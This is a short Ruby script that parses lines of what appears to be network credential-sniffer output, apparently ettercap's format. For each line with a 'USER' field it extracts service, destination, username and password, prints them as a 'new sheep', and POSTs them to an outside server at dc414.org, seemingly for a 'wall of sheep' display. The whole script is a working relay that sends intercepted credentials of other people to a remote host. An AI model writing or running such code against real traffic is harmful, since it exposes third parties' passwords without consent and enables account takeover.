require 'net/http'
require 'net/https'
require 'cgi'
require 'uri'
require 'addressable/uri'

def post(svc, username, password, dest, comment = "") 
	url = 'www.dc414.org'
	http = Net::HTTP.new(url, 443)
	http.use_ssl = true
	path = '/sheep/service.php'
	data = ''
	dataVals = {
			'service' => 'save',
			'svc'     => svc,
			'username' => username,
			'password' => password,
			'destination' => dest,
			'comments' => comment,
	}
	
	data = Addressable::URI.new
	data.query_values = dataVals
	
	#dataVals.each {|k,v|
	#	data = data + "#{k}=#{v}&amp;"
	#}

	headers = {'Content-Type'=> 'application/x-www-form-urlencoded'}
	resp, data = http.post(path, data.query, headers)
	puts resp.body
end

gets.split("\n").each do |a|
	if a =~ /USER/
		b = a.split(" ")
		sheep = {
			'svc'  => b[0],
			'user' => b[5],
			'pass' => b[7],
			'dest' => b[2],
			'info' => b[9]
		}

		puts "new sheep: #{sheep['user']} -> #{sheep['svc']} : #{sheep['dest']}"
		post(sheep['svc'],sheep['user'],sheep['pass'],sheep['dest'],sheep['info'])
	end
end

#post(dump[0], dump[1], dump[2], dump[3], dump[4])
